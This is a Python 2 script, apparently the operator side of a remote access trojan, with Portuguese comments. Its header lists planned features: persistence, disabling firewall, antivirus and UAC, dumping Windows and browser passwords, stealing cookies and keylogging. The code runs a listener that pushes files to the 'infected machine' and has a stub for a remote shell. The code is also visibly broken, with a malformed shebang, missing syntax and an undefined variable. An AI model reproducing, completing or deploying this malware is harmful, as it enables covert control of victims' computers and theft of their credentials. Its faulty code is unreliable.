#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

# funcionalidades
# persistencia
# upload
# copiar arquivos
# copiar pasta
# screenshot
# desabilitar firewall / antivirus
# desabilitar UAC
# dump de senhas windows, google chrome, internet explorer
# steal cookies
# keylogger

import os
import datetime
import time
import socket
import sha
import subprocess
import sys

# cores
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def help():
    print('Comandos:\nupload - Escolha um arquivo para fazer upload na maquina infectada')
    print('shell - digite shell, para obter uma shell na maquina do cliente')

def upload(s, caminho_arquivo=False):
    comando = subprocess.Popen('zenity --file-selection --title Escolha_um_arquivo', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    retorno = comando.stdout.read()
    nome_arquivo = os.path.basename(retorno)
    retorno = retorno.replace('\n','')
    caminho_arq = retorno.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
    if(os.path.isfile(retorno)):
        s.send(nome_arquivo)
        f = open(caminho_arq,'rb')
        l = f.read(1024)
        while(l):
            s.send(l)
            l = f.read(1024)

def identifica(comando, s):
    comando = comando.split(' ')
    tam = len(comando)
    if(tam>1):
        print('{0}Comando errado ou não existe, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
    else:
        if(comando[0]=='upload')
            upload(s)
            comando = ' '.join(comando)
            conexao.send(comando)
        elif(comando=='shell'):
            pass'
        else:
            print('{0}Comando errado ou não existe, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)

def conecta(meuIP):
    while True:
        porta=1025
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # se der ctrl + c, ele para de escutar na porta
        socket_obj.bind((meuIP, porta))
        socket_obj.listen(1) # escutando conexões
        print('{0}[+] Aguardando conexões...').format(GREEN)
    	conexao,endereco=socket_obj.accept()
        retorno = conexao.recv(1024)
        print(retorno)
        while True:
            try:
                comando = raw_input('\033[0m-> ')
                identifica(comando, conexao)
                recebido = conexao.recv(1024)
                print(recebido)
            except socket.error as e:
                print('Erro: '+ str(e))
                break

if __name__ == '__main__':
    conecta('127.0.0.1')
